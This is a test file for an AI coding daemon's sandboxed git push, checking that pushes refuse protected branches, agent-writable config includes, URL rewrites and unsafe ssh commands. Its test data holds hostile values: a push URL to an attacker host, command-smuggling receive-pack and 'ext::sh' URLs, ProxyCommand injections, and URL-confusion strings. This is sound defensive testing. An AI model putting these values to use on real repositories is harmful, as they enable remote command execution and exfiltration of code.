/**
 * The sandbox's `push` (sandbox/push.ts): what is pushed, from where, to
 * where, and what is refused — against real git repositories and a local
 * bare remote (file://, a test-only allowance: a real push takes ssh and
 * https only).
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execFileSync, spawn } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { GIT_BIN } from "../daemon/git-env.js";
import { isPushTool, isSafeTool, roleDeniesTool } from "../daemon/providers/tool-safety.js";
import { branchMatches, bundleFromChild, cleanPushInput, planPush, pushUrlProblem, type RunOptions, runPush, shownUrl, type PushPlan } from "../daemon/sandbox/push.js";
import { SandboxMcpHttp } from "../daemon/sandbox/request-directory.js";

let root: string;
let repo: string;
let bare: string;
let savedHome: string | undefined;
const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", args, { cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", HOME: root, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }).trim();

beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), "codeoid-push-")));
  // The daemon's git reads HOME's ~/.gitconfig as "your global config": here, a scratch one.
  savedHome = process.env.HOME;
  process.env.HOME = root;
  bare = join(root, "remote.git");
  repo = join(root, "work", "repo");
  mkdirSync(repo, { recursive: true });
  git(root, "init", "-q", "--bare", "-b", "main", bare);
  git(repo, "init", "-q", "-b", "main");
  writeFileSync(join(repo, "a.txt"), "a\n");
  git(repo, "add", ".");
  git(repo, "commit", "-q", "-m", "first");
  git(repo, "remote", "add", "origin", `file://${bare}`);
  git(repo, "push", "-q", "origin", "main");
  git(repo, "checkout", "-q", "-b", "feature/x");
  writeFileSync(join(repo, "b.txt"), "b\n");
  git(repo, "add", ".");
  git(repo, "commit", "-q", "-m", "second");
});
afterEach(() => {
  process.env.HOME = savedHome;
  rmSync(root, { recursive: true, force: true });
});

/** As a session passes them: the repository's git dir held read-only, the workspace the agent's to write. */
const opts = () => ({ protectedBranches: ["main", "master"], home: root, _testFileRemote: true, heldReadOnly: [join(repo, ".git")], agentWritable: [repo, join(root, "scratch")] });
const plan = async (input: Parameters<typeof planPush>[1] = {}, o: Partial<Parameters<typeof planPush>[2]> = {}) => planPush(repo, input, { ...opts(), ...o });
const planned = async (input: Parameters<typeof planPush>[1] = {}): Promise<PushPlan> => {
  const p = await plan(input);
  if ("refused" in p) throw new Error(p.refused);
  return p;
};
/** The session's bundler, on the host (the real one runs inside the sandbox: sandbox-push-manager.test.ts). */
const hostBundle = (r: string, ref: string, dest: string) => bundleFromChild(spawn("git", ["-C", r, "bundle", "create", "-q", "-", ref]), dest, { timeoutMs: 30_000 });
/** runPush as the session calls it, against the local bare remote. */
const run = (p: PushPlan, o: Partial<RunOptions> = {}) => runPush(p, { timeoutMs: 60_000, _testFileRemote: true, stagingRoot: join(root, "staging"), makeBundle: hostBundle, ...o });
const refusal = async (input: Parameters<typeof planPush>[1] = {}, o: Partial<Parameters<typeof planPush>[2]> = {}): Promise<string> => {
  const p = await plan(input, o);
  if (!("refused" in p)) throw new Error(`expected a refusal, got a plan for ${p.branch}`);
  return p.refused;
};

describe("push: the plan", () => {
  test("the checked-out branch, as its commit now, to origin's URL from the repository's own config", async () => {
    const p = await planned();
    expect(p).toMatchObject({ branch: "feature/x", remote: "origin", url: `file://${bare}`, sha: git(repo, "rev-parse", "HEAD"), sshCommand: null, defaultUnknown: false });
  });

  test("never main, master, a protected pattern, or the remote's default branch", async () => {
    git(repo, "checkout", "-q", "main");
    expect(await refusal()).toContain("protected branch");
    expect(await refusal({ branch: "feature/x" }, { protectedBranches: ["feature/*"] })).toContain("protected branch");
    expect(await refusal({ branch: "feature/x" }, { remoteDefault: async () => "feature/x" })).toContain("the remote's default branch");
    expect(await refusal({ branch: "feature/x" }, { remoteDefault: async () => "Feature/X" })).toContain("the remote's default branch");
    expect(await refusal({ branch: "feature/x" }, { protectedBranches: ["FEATURE/*"] })).toContain("protected branch");
    // The default couldn't be read: the plan says so (the session refuses it in autonomous mode, and says it on the card).
    expect(await planned({ branch: "feature/x" })).toMatchObject({ defaultUnknown: false });
    const unknown = await plan({ branch: "feature/x" }, { remoteDefault: async () => null });
    expect("refused" in unknown ? null : unknown.defaultUnknown).toBe(true);
    expect(branchMatches("release/*", "release/1.2")).toBe(true);
    expect(branchMatches("release/*", "releases")).toBe(false);
  });

  test("a detached HEAD, a branch that doesn't exist, a remote that doesn't, a non-repository: refused, saying why", async () => {
    git(repo, "checkout", "-q", "--detach");
    expect(await refusal()).toContain("detached HEAD");
    expect(await refusal({ branch: "nope" })).toContain("no local branch nope");
    expect(await refusal({ branch: "feature/x", remote: "upstream" })).toContain("no remote named upstream");
    const plain = join(root, "plain");
    mkdirSync(plain);
    expect("refused" in (await planPush(plain, {}, opts()))).toBe(true);
  });

  test("where the push goes is decided only by your config and the repository's own .git/config: an include's remote, rewrite or proxy is refused", async () => {
    const inc = join(root, "work", "inc.cfg");
    for (const body of ['[remote "origin"]\n\tpushurl = https://evil.example/x.git\n', '[url "https://evil.example/"]\n\tinsteadOf = file://\n', "[http]\n\tproxy = http://evil.example:1\n", "[core]\n\tsshCommand = ssh -o ProxyCommand=evil\n"]) {
      writeFileSync(inc, body);
      git(repo, "config", "include.path", inc);
      expect(await refusal()).toMatch(/a file this session's agent could write|includes another file/);
      git(repo, "config", "--unset", "include.path");
    }
    // The repository's own config is the user's (read-only to sandboxed commands): its settings are taken.
    git(repo, "config", "http.postBuffer", "1048576");
    expect("refused" in (await plan())).toBe(false);
    // But never, from there, what turns a push into a leak or a remote command.
    for (const [k, v] of [["http.proxy", "http://evil.example:1"], ["http.sslVerify", "false"], ["http.https://x.example/.extraHeader", "X: y"], ["remote.origin.receivepack", "touch /tmp/x; git-receive-pack"], ["core.sshCommand", "ssh -o ProxyCommand=evil"], ["credential.username", "x"]] as const) {
      git(repo, "config", k, v);
      expect([k, await refusal()]).toEqual([k, expect.stringContaining("never uses for a push it makes")]);
      git(repo, "config", "--unset", k);
    }
  });

  test("round 1: a repository whose config the sandbox doesn't hold decides nothing", async () => {
    expect(await refusal({}, { heldReadOnly: [] })).toContain("aren't held read-only by this session's sandbox");
    expect(await refusal({}, { heldReadOnly: [join(root, "elsewhere")] })).toContain("aren't held read-only");
  });

  test("round 3: an owner's trust matches only the same repository, remote, URL and repository settings", async () => {
    const { trustMatches } = await import("../daemon/sandbox/push.js");
    const p = await planned();
    const trust = { common: p.common, remote: p.remote, url: p.url, repoSettings: p.repoSettings, userSettings: p.userSettings };
    expect(trustMatches(trust, p)).toBe(true);
    expect(trustMatches(null, p)).toBe(false);
    expect(trustMatches({ ...trust, url: "https://elsewhere.example/x.git" }, p)).toBe(false);
    expect(trustMatches({ ...trust, remote: "upstream" }, p)).toBe(false);
    expect(trustMatches({ ...trust, common: join(root, "other", ".git") }, p)).toBe(false);
    // A setting of the repository's own that decides a push, added since: no longer what was trusted.
    git(repo, "config", "push.default", "current");
    const changed = await planned();
    expect(trustMatches(trust, changed)).toBe(false);
    // Branch tracking, attributes and the like aren't part of it.
    git(repo, "config", "--unset", "push.default");
    git(repo, "config", "branch.feature/x.remote", "origin");
    writeFileSync(join(repo, ".gitattributes"), "*.png binary\n");
    expect(trustMatches(trust, await planned())).toBe(true);
  });

  test("round 4: a rewrite in the repository's own config, or a remote section named as a URL, is refused", async () => {
    for (const k of [`url.file://${root}/evil.git.pushInsteadOf`, `url.file://${root}/evil.git.insteadOf`]) {
      git(repo, "config", k, `file://${bare}`);
      expect([k, await refusal()]).toEqual([k, expect.stringContaining("never uses for a push it makes")]);
      git(repo, "config", "--unset", k);
    }
    git(repo, "config", `remote.file://${bare}.pushurl`, `file://${root}/evil.git`);
    expect(await refusal()).toContain("a remote section named as a URL");
    git(repo, "config", "--remove-section", `remote.file://${bare}`);
    // In your global config too (git applies it to a push to that URL).
    writeFileSync(join(root, ".gitconfig"), `[remote "file://${bare}"]\n\tpushurl = file://${root}/evil.git\n`);
    expect(await refusal()).toContain("a remote section named as a URL");
  });

  test("round 4: your own rewrite is followed and shown: the URL checked, shown and trusted is where git pushes", async () => {
    const other = join(root, "other.git");
    git(root, "init", "-q", "--bare", "-b", "main", other);
    writeFileSync(join(root, ".gitconfig"), `[url "file://${other}"]\n\tpushInsteadOf = file://${bare}\n`);
    const p = await planned();
    expect(p).toMatchObject({ url: `file://${other}`, configuredUrl: `file://${bare}` });
    expect(p.userSettings.some((x) => x.includes("pushinsteadof"))).toBe(true);
    const r = await run(p);
    expect(r.ok).toBe(true);
    expect(git(other, "rev-parse", "refs/heads/feature/x")).toBe(p.sha);
    // A rewrite added after the plan: git would push elsewhere, so nothing is pushed.
    writeFileSync(join(root, ".gitconfig"), "");
    const p2 = await planned();
    writeFileSync(join(root, ".gitconfig"), `[url "file://${other}"]\n\tpushInsteadOf = file://${bare}\n`);
    expect(await run(p2)).toMatchObject({ ok: false, summary: expect.stringContaining("rewrites") });
  });

  test("round 5: the push is made from the daemon's own repository: only the planned commit, as the sandbox bundled it; the agent's repository isn't read or written", async () => {
    const p = await planned();
    // What the sandbox bundled isn't the commit that was checked (a ref moved, a bundle of something else): refused.
    const fake = join(root, "fake");
    git(root, "clone", "-q", "-b", "main", repo, fake);
    git(fake, "checkout", "-q", "-b", "feature/x");
    git(fake, "commit", "-q", "--allow-empty", "-m", "unrelated");
    const other = await run(p, { makeBundle: (_r, ref, dest) => hostBundle(fake, ref, dest) });
    expect(other).toMatchObject({ ok: false, summary: expect.stringContaining("doesn't have the commit that was checked") });
    expect(git(bare, "for-each-ref", "refs/heads/feature")).toBe("");
    // The sandbox couldn't bundle it (a link into a path it hides leads nowhere there): refused, saying so.
    expect(await run(p, { makeBundle: async () => "fatal: bad object" })).toMatchObject({ ok: false, summary: expect.stringContaining("couldn't be bundled in the session's sandbox (fatal: bad object)") });
    expect(await run(p, { makeBundle: async () => Promise.reject(new Error("boom")) })).toMatchObject({ ok: false, summary: expect.stringContaining("(boom)") });
    // Nothing the push does writes into the agent's repository (no remote-tracking ref, no reflog, no FETCH_HEAD).
    const store = () => (readdirSync(join(repo, ".git"), { recursive: true }) as string[]).sort().map((f) => `${f} ${statSync(join(repo, ".git", f)).size}`);
    const before = store();
    expect(await run(p)).toMatchObject({ ok: true });
    expect(store()).toEqual(before);
    // The staging repository is gone after each push.
    expect(readdirSync(join(root, "staging"))).toEqual([]);
  });

  test("round 6: what the sandbox wrote is taken only as a bundle: a gitfile naming a hidden repository is refused, nothing of it pushed", async () => {
    const secret = join(root, "hidden");
    git(root, "clone", "-q", repo, secret);
    git(secret, "checkout", "-q", "feature/x");
    writeFileSync(join(secret, "secret.txt"), "TOPSECRET\n");
    git(secret, "add", ".");
    git(secret, "commit", "-q", "-m", "TOPSECRET-HISTORY");
    const p = { ...(await planned()), sha: git(secret, "rev-parse", "HEAD") };
    for (const body of [`gitdir: ${join(secret, ".git")}\n`, "# v3 git bundle\n@filter=blob:none\n\n", ""]) {
      const r = await run(p, { makeBundle: async (_r, _ref, dest) => {
          writeFileSync(dest, body);
          return null;
        },
      });
      expect(r).toMatchObject({ ok: false, summary: expect.stringContaining("isn't a plain git bundle") });
    }
    expect(git(bare, "for-each-ref", "refs/heads/feature")).toBe("");
    // A refusal for a moved branch names no commit (the agent reads it).
    const moved = await run(p);
    expect(moved.summary).toContain("doesn't have the commit that was checked");
    expect(moved.summary).not.toMatch(/[0-9a-f]{12}/);
  });

  test("round 6: the branch and its commit are read by the query the session gives (inside its sandbox), not the host's git", async () => {
    const asked: string[][] = [];
    const p = await plan({}, {
      refGit: async (_repo, args) => {
        asked.push(args);
        return args[0] === "symbolic-ref" ? "refs/heads/feature/x\n" : null;
      },
    });
    expect(p).toEqual({ refused: "there is no local branch feature/x: commit to it first" });
    expect(asked.map((a) => a[0])).toEqual(["symbolic-ref", "rev-parse"]);
    // Round 7: a query that couldn't run is said as that, never as "no branch".
    const broken = await plan({}, {
      refGit: async () => {
        throw new Error("git: not found");
      },
    });
    expect(broken).toEqual({ refused: "the session's sandbox couldn't run git to read the branch (git: not found)" });
  });

  test("round 8: a URL whose host git and the card read differently is refused", () => {
    for (const url of ["https://github.com\\@evil.example/o/r.git", "https://github.com:443\\@evil.example/o/r.git", "https://evil.example?@github.com/o/r.git", "https://evil.example#@github.com/o/r.git", "https://a@b@github.com/o/r.git", "https://gith%75b.com/o/r.git", "ssh://git@github.com\\@evil.example/o/r.git"]) {
      expect([url, pushUrlProblem(url)]).toEqual([url, expect.any(String)]);
    }
    for (const url of ["https://github.com/o/r.git", "https://user@bitbucket.org/t/r.git", "ssh://git@host:2222/x.git", "https://[::1]:8443/x.git"]) expect([url, pushUrlProblem(url)]).toEqual([url, null]);
  });

  test("round 9: your config must apply to the push as where it was checked: a conditional include that differs refuses it, naming the keys", async () => {
    const { differingKeys } = await import("../daemon/sandbox/push.js");
    const inc = join(root, "work.gitconfig");
    writeFileSync(inc, '[credential "https://git.example.invalid"]\n\tusername = work-account\n[http]\n\tsslVerify = false\n');
    writeFileSync(join(root, ".gitconfig"), `[credential]\n\thelper = store\n[includeIf "gitdir:${repo}/"]\n\tpath = ${inc}\n[http]\n\tsslVerify = true\n`);
    const p = await planned();
    expect(p.userEntries).toEqual([
      ["credential.helper", "store"],
      ["credential.https://git.example.invalid.username", "work-account"],
      ["http.sslverify", "false"],
      ["http.sslverify", "true"],
    ]);
    // In codeoid's staging repository the gitdir: include doesn't apply: refused, never pushed with other settings.
    const r = await run(p);
    expect(r).toMatchObject({ ok: false, refused: true, summary: expect.stringContaining("credential.https://git.example.invalid.username, http.sslverify") });
    expect(String(r.summary).includes("work-account")).toBe(false);
    expect(git(bare, "for-each-ref", "refs/heads/feature")).toBe("");
    // Order counts (last wins), and so does a value only one side has.
    expect(differingKeys([["a", "1"], ["a", "2"]], [["a", "2"], ["a", "1"]])).toEqual(["a"]);
    expect(differingKeys([["a", "1"]], [["a", "1"], ["b", "x"]])).toEqual(["b"]);
    expect(differingKeys([["a", "1"]], [["a", "1"]])).toEqual([]);
    // Unconditional settings apply in both: the push goes ahead.
    writeFileSync(join(root, ".gitconfig"), `[credential]\n\thelper = store\n[credential "https://git.example.invalid"]\n\tusername = work-account\n`);
    expect(await run(await planned())).toMatchObject({ ok: true });
  });

  test("round 8: the push's PATH holds nothing a session may write; an ssh command or credential helper there is refused", async () => {
    const { commandProblem, safePathFor } = await import("../daemon/sandbox/push.js");
    const bin = join(repo, "bin");
    expect(safePathFor([repo], `${bin}:/usr/bin:./node_modules/.bin:/bin`).split(":")).not.toContain(bin);
    expect(safePathFor([repo], `${bin}:/usr/bin`).split(":")).toContain("/usr/bin");
    expect(safePathFor([repo], "node_modules/.bin:.").split(":")).toEqual([...new Set([dirname(GIT_BIN), dirname(realpathSync(GIT_BIN))])]);
    expect(commandProblem(`${bin}/ssh -i k`, [repo])).toContain("may write");
    expect(commandProblem(`!${bin}/helper get`, [repo])).toContain("may write");
    expect(commandProblem(`"${bin}/ssh"`, [repo])).toContain("may write");
    expect(commandProblem("ssh -i ~/.ssh/k", [repo])).toBeNull();
    expect(commandProblem("/usr/bin/ssh", [repo])).toBeNull();
    // A planned ssh command in a session's writable dir: refused, flagged as a refusal (not a failure).
    const p = { ...(await planned()), sshCommand: `${bin}/ssh` };
    expect(await run(p, { hostWritable: [repo] })).toMatchObject({ ok: false, refused: true, summary: expect.stringContaining("may write") });
    expect(await run(await planned(), { hostWritable: [repo] })).toMatchObject({ ok: true });
    // Round 9: anything under your home is out (a session that wrote there may be gone), and every path a command names counts.
    const { hostPathProblem } = await import("../daemon/sandbox/push.js");
    const home = join(root, "h");
    expect(safePathFor([], `${join(home, ".local", "bin")}:/usr/bin`, home).split(":")).not.toContain(join(home, ".local", "bin"));
    expect(hostPathProblem(join(home, ".local", "bin", "ssh"), [], home)).toContain("under your home");
    expect(commandProblem(`sh -c '${bin}/helper get'`, [repo])).toContain("may write");
    expect(commandProblem("~/bin/helper", [], home)).toContain("under your home");
    expect(commandProblem("./helper", [])).toContain("relative");
    expect(commandProblem("ssh -i ~/.ssh/id -F ~/.ssh/config", [], home)).toBeNull();
    const shared = join(root, "shared");
    mkdirSync(shared);
    chmodSync(shared, 0o777);
    expect(hostPathProblem(join(shared, "ssh"), [], join(root, "elsewhere-home"))).toContain("writable by everyone");
    // Round 10: group-writable by your own group (Homebrew, Linuxbrew) is fine; the owner must be you or root.
    const brew = join(root, "brew", "bin");
    mkdirSync(brew, { recursive: true });
    chmodSync(brew, 0o775);
    chmodSync(join(root, "brew"), 0o775);
    expect(hostPathProblem(join(brew, "git"), [], join(root, "elsewhere-home"))).toBeNull();
    expect(hostPathProblem("/usr/bin/ssh", [], join(root, "elsewhere-home"))).toBeNull();
    // GIT_SSH is run as git would (always set explicitly, so the base override's bare ssh never decides).
    const marker = join(root, "git-ssh-ran");
    const wrapper = join(root, "my ssh");
    writeFileSync(wrapper, `#!/bin/sh\ntouch '${marker}'\nexit 1\n`);
    chmodSync(wrapper, 0o755);
    const sshPlan = { ...(await planned()), url: "ssh://git@example.invalid/x.git" };
    process.env.GIT_SSH = wrapper;
    try {
      await run(sshPlan, { checkDefault: "allow-unknown", _testFileRemote: false });
    } finally {
      delete process.env.GIT_SSH;
    }
    expect(existsSync(marker)).toBe(true);
  });

  test("round 10/11: what git runs as a program comes from your own config files: an include only when it is yours alone, never a session's", async () => {
    // An include of yours (a per-folder ssh key), yours alone: taken.
    const inc = join(root, "work.gitconfig");
    writeFileSync(inc, "[core]\n\tsshCommand = ssh -i ~/.ssh/k\n");
    chmodSync(inc, 0o644);
    writeFileSync(join(root, ".gitconfig"), `[includeIf "gitdir:${repo}/"]\n\tpath = ${inc}\n`);
    expect(await planned()).toMatchObject({ sshCommand: "ssh -i ~/.ssh/k" });
    // One everyone may write: refused, saying how else.
    chmodSync(inc, 0o666);
    expect(await refusal()).toContain("Host alias in ~/.ssh/config");
    chmodSync(inc, 0o644);
    // One a session may write (or could): refused, naming how to clear it once checked.
    mkdirSync(join(root, "scratch"), { recursive: true });
    const theirs = join(root, "scratch", "team.gitconfig");
    writeFileSync(theirs, "[credential]\n\thelper = store\n");
    writeFileSync(join(root, ".gitconfig"), `[include]\n\tpath = ${theirs}\n`);
    expect(await refusal()).toMatch(/includes .*can \(or could\) write|can \(or could\) write/);
    writeFileSync(join(root, ".gitconfig"), "[core]\n\tsshCommand = ssh -i ~/.ssh/k\n");
    expect(await planned()).toMatchObject({ sshCommand: "ssh -i ~/.ssh/k" });
  });

  test("round 11: a setting shown to the owner never shows a credential, in its value or in its key", async () => {
    const { shownSetting } = await import("../daemon/sandbox/push.js");
    expect(shownSetting("global\thttp.extraheader\tAuthorization: Bearer x")).toBe("http.extraheader = (hidden)");
    expect(shownSetting("global\thttp.proxy\thttp://p:1")).toBe("http.proxy = http://p:1");
    for (const entry of [
      "global\turl.https://bob:ghp_FAKE1234@github.com/.insteadof\thttps://github.com/",
      "global\turl.https://ghp_FAKE1234@github.com/.pushinsteadof\thttps://github.com/",
      "global\thttp.https://bob:hunter2@git.example.com/.sslverify\tfalse",
      "global\thttp.proxy\thttp://user:ghp_FAKE1234@proxy:8080",
      "global\turl.https://host/x?private_token=ghp_FAKE1234.insteadof\thttps://host/",
      "global\tcredential.helper\t!f() { echo password=ghp_FAKE1234; }; f",
    ]) {
      const shown = shownSetting(entry);
      expect([entry, shown.includes("ghp_FAKE1234") || shown.includes("hunter2")]).toEqual([entry, false]);
    }
  });

  test("round 11: a recorded writable dir that no longer resolves (a file now, unreadable) decides nothing and breaks nothing", async () => {
    const { gitBinProblem, hostPathProblem, safePathFor } = await import("../daemon/sandbox/push.js");
    const gone = join(root, "was-a-workspace");
    writeFileSync(gone, "a file now\n");
    const history = [join(gone, "inner"), join(root, "never-made", "x")];
    expect(gitBinProblem("/usr/bin/git", history, join(root, "h"))).toBeNull();
    expect(hostPathProblem("/usr/bin", history, join(root, "h"))).toBeNull();
    expect(safePathFor(history, "/usr/bin", join(root, "h"))).toContain("/usr/bin");
    expect(await plan({}, { agentWritable: [repo, ...history] })).not.toHaveProperty("refused");
  });

  test("round 11: a branch name with an invisible or reordering character is refused (the card shows names as they are)", async () => {
    for (const branch of ["ma\u200bin", "fix/\u202etsil-wolla\u202c", "a\u2028b", "x\u00ady"]) expect(typeof cleanPushInput({ branch })).toBe("string");
    expect(cleanPushInput({ branch: "feature/ü-ok" })).toEqual({ branch: "feature/ü-ok" });
  });

  test("round 11: the history of writable dirs is seeded once from the sessions made before it, and can be forgotten", async () => {
    const { Store } = await import("../daemon/store.js");
    const { Database } = await import("bun:sqlite");
    const dbPath = join(root, "seed.db");
    const first = new Store(dbPath);
    first.createSession({ id: "s1", name: "old", workdir: join(root, "old-work"), status: "idle", createdBy: "u", createdAt: new Date().toISOString(), attachedClients: 0, accountId: "a", projectId: "p" });
    first.close();
    // A database from before the history: no table yet.
    const raw = new Database(dbPath);
    raw.exec("DROP TABLE sandbox_writable");
    raw.close();
    const again = new Store(dbPath);
    expect(again.sandboxWritableHistory()).toContain(join(root, "old-work"));
    again.noteSandboxWritable([join(root, "old-work", "sub"), join(root, "keep")]);
    expect(again.forgetSandboxWritable(join(root, "old-work"))).toBe(2);
    expect(again.sandboxWritableHistory()).toEqual([join(root, "keep")]);
    again.close();
    // Seeded once only: a later start doesn't bring the forgotten back.
    const later = new Store(dbPath);
    expect(later.sandboxWritableHistory()).toEqual([join(root, "keep")]);
    later.close();
  });

  test("round 7: a tag named like the checked-out branch doesn't change which branch is pushed", async () => {
    git(repo, "tag", "feature/x");
    expect(await planned()).toMatchObject({ branch: "feature/x", sha: git(repo, "rev-parse", "refs/heads/feature/x") });
  });

  test("round 7: a git in anything a session may write is never the one run inside the sandbox", async () => {
    const { gitBinProblem } = await import("../daemon/sandbox/push.js");
    expect(gitBinProblem(join(repo, "bin", "git"), [repo])).toContain("may write");
    expect(gitBinProblem(join(root, "home", ".local", "bin", "git"), [join(root, "home")])).not.toBeNull();
    const linked = join(root, "linked-bin");
    mkdirSync(join(repo, "bin"), { recursive: true });
    symlinkSync(join(repo, "bin"), linked);
    expect(gitBinProblem(join(linked, "git"), [repo])).not.toBeNull();
    expect(gitBinProblem("/usr/bin/git", [repo, join(root, "scratch")])).toBeNull();
    expect(gitBinProblem("git", [])).toContain("no git");
  });

  test("round 7: the header is read whole: a filter anywhere, a second capability, a header that doesn't end, are refused; sha256 is staged as sha256", async () => {
    const { readBundleHeader } = await import("../daemon/sandbox/push.js");
    const sha = git(repo, "rev-parse", "HEAD");
    const f = join(root, "h.bundle");
    const verdict = (body: string) => {
      rmSync(f, { force: true });
      writeFileSync(f, body);
      return readBundleHeader(f);
    };
    expect(verdict(`# v3 git bundle\n@object-format=sha1\n${sha} refs/heads/feature/x\n\nPACK`)).toEqual({ format: "sha1" });
    expect(verdict(`# v2 git bundle\n${sha} refs/heads/feature/x\n\nPACK`)).toEqual({ format: "sha1" });
    expect(verdict(`# v3 git bundle\n${sha} refs/heads/feature/x\n@object-format=sha1\n@filter=blob:none\n\nPACK`)).toMatchObject({ problem: expect.stringContaining("capability") });
    expect(verdict(`# v3 git bundle\n${"@object-format=sha1\n".repeat(2)}${sha} refs/heads/x\n\n`)).toMatchObject({ problem: expect.stringContaining("capability") });
    expect(verdict(`# v3 git bundle\n${"@object-format=sha1\n".repeat(5000)}@filter=blob:none\n\n`)).toMatchObject({ problem: expect.any(String) });
    expect(verdict(`# v2 git bundle\n@object-format=sha1\n${sha} refs/heads/x\n\n`)).toMatchObject({ problem: expect.stringContaining("capability") });
    expect(verdict("# v2 git bundle\ngitdir: /x\n\n")).toMatchObject({ problem: expect.stringContaining("isn't a ref") });
    // A sha256 repository pushes (its bundle staged in a sha256 repository).
    const s256 = join(root, "s256");
    const bare256 = join(root, "s256.git");
    git(root, "init", "-q", "--bare", "--object-format=sha256", "-b", "main", bare256);
    git(root, "init", "-q", "--object-format=sha256", "-b", "feature/z", s256);
    writeFileSync(join(s256, "z.txt"), "z\n");
    git(s256, "add", ".");
    git(s256, "commit", "-q", "-m", "z");
    git(s256, "remote", "add", "origin", `file://${bare256}`);
    const p = await planPush(s256, {}, { ...opts(), heldReadOnly: [join(s256, ".git")], agentWritable: [s256] });
    if ("refused" in p) throw new Error(p.refused);
    expect(p.sha).toHaveLength(64);
    expect(await run(p)).toMatchObject({ ok: true });
    expect(git(bare256, "rev-parse", "refs/heads/feature/z")).toBe(p.sha);
  });

  test("round 6: the staging dir must be the daemon's own, closed to others; one a stopped daemon left is swept", async () => {
    const { stagingRootProblem } = await import("../daemon/sandbox/push.js");
    const open = join(root, "open-staging");
    mkdirSync(open, { mode: 0o755 });
    chmodSync(open, 0o755);
    expect(stagingRootProblem(open)).toContain("open to others");
    const link = join(root, "link-staging");
    symlinkSync(open, link);
    expect(stagingRootProblem(link)).toContain("isn't a directory");
    expect(await run(await planned(), { stagingRoot: link })).toMatchObject({ ok: false, summary: expect.stringContaining("isn't a directory") });
    const staging = join(root, "staging");
    mkdirSync(join(staging, "push-old"), { recursive: true, mode: 0o700 });
    chmodSync(staging, 0o700);
    const old = new Date(Date.now() - 7 * 60 * 60 * 1000);
    utimesSync(join(staging, "push-old"), old, old);
    expect(await run(await planned())).toMatchObject({ ok: true });
    expect(readdirSync(staging)).toEqual([]);
  });

  test("round 5: the bundle stream goes only into a new file of the daemon's, and stops at its size cap", async () => {
    const dest = join(root, "staged.bundle");
    symlinkSync(join(root, "elsewhere"), dest);
    expect(await bundleFromChild(spawn("git", ["-C", repo, "bundle", "create", "-q", "-", "HEAD"]), dest, { timeoutMs: 30_000 })).toContain("staging file couldn't be made");
    expect(existsSync(join(root, "elsewhere"))).toBe(false);
    rmSync(dest);
    expect(await bundleFromChild(spawn("git", ["-C", repo, "bundle", "create", "-q", "-", "HEAD"]), dest, { timeoutMs: 30_000, maxBytes: 10 })).toContain("too big");
    rmSync(dest);
    expect(await bundleFromChild(spawn("git", ["-C", repo, "bundle", "create", "-q", "-", "nope"]), dest, { timeoutMs: 30_000 })).not.toBeNull();
  });

  test("round 4: your global push settings are part of a trust: one changed since doesn't match", async () => {
    const { trustMatches } = await import("../daemon/sandbox/push.js");
    const p = await planned();
    const trust = { common: p.common, remote: p.remote, url: p.url, repoSettings: p.repoSettings, userSettings: p.userSettings };
    writeFileSync(join(root, ".gitconfig"), "[http]\n\tproxy = http://changed.example:1\n");
    expect(trustMatches(trust, await planned())).toBe(false);
  });

  test("round 1: an include of your global config that the agent can write decides nothing, even empty or missing now; your own ssh command is used", async () => {
    mkdirSync(join(root, "scratch"), { recursive: true });
    const team = join(root, "scratch", "team.gitconfig");
    writeFileSync(team, '[remote "origin"]\n\tpushurl = ssh://git@attacker.example/loot.git\n');
    writeFileSync(join(root, ".gitconfig"), `[include]\n\tpath = ${team}\n`);
    expect(await refusal()).toContain("can (or could) write");
    // Round 2: judged by what it names, not what is there now (git reads it again when it pushes).
    writeFileSync(team, "[alias]\n\tst = status\n");
    expect(await refusal()).toContain("includes");
    rmSync(team);
    writeFileSync(join(root, ".gitconfig"), `[includeIf "gitdir:${repo}/"]\n\tpath = ${team}\n`);
    expect(await refusal()).toContain("includes");
    // The repository's own config never includes for a push.
    writeFileSync(join(root, ".gitconfig"), "");
    git(repo, "config", "include.path", "../../outside.gitconfig");
    expect(await refusal()).toContain("includes another file");
    git(repo, "config", "--unset", "include.path");
    writeFileSync(join(root, ".gitconfig"), "[core]\n\tsshCommand = ssh -i ~/.ssh/work_key\n");
    expect(await planned()).toMatchObject({ sshCommand: "ssh -i ~/.ssh/work_key" });
    // Round 2: the default-branch lookup is given it too.
    const seen: Array<string | null> = [];
    await plan({}, {
      remoteDefault: async (_u, _c, _t, ssh) => {
        seen.push(ssh);
        return null;
      },
    });
    expect(seen).toEqual(["ssh -i ~/.ssh/work_key"]);
  });

  test("only ssh and https remotes are pushed to for real; two push URLs, or borrowed objects, are refused", async () => {
    expect(await refusal({}, { _testFileRemote: false })).toContain("only ssh and https");
    for (const url of ["git@bitbucket.org:team/repo.git", "ssh://git@host:2222/x.git", "https://bitbucket.org/team/repo.git"]) expect([url, pushUrlProblem(url)]).toEqual([url, null]);
    for (const url of ["file:///tmp/x", "ext::sh -c touch% /tmp/pwned", "-oProxyCommand=x:y", "http://plain.example/x.git", "/abs/path"]) expect(pushUrlProblem(url)).not.toBeNull();
    expect(shownUrl("https://user:tok@host/x.git?k=v")).not.toContain("tok");
    git(repo, "config", "--add", "remote.origin.pushurl", `file://${bare}`);
    git(repo, "config", "--add", "remote.origin.pushurl", `file://${bare}`);
    expect(await refusal()).toContain("2 push URLs");
    git(repo, "config", "--unset-all", "remote.origin.pushurl");
    writeFileSync(join(repo, ".git", "objects", "info", "alternates"), "/elsewhere/objects\n");
    expect(await refusal()).toContain("borrows objects");
  });

  test("the tool's input: a branch name and a remote name, checked", () => {
    expect(cleanPushInput({ branch: "feature/x", remote: "origin" })).toEqual({ branch: "feature/x", remote: "origin" });
    for (const branch of ["-f", "a..b", "x:y", "+main", ":refs/heads/main", "main~1", "a b"]) expect(typeof cleanPushInput({ branch })).toBe("string");
    for (const remote of ["--receive-pack=x", "a/b", "ext::sh"]) expect(typeof cleanPushInput({ remote })).toBe("string");
    expect(typeof cleanPushInput({ branch: 3 })).toBe("string");
  });
});

describe("push: the run", () => {
  test("pushes the one branch, as planned, to the same branch; nothing else (no other branch, no tags); a second push is up to date", async () => {
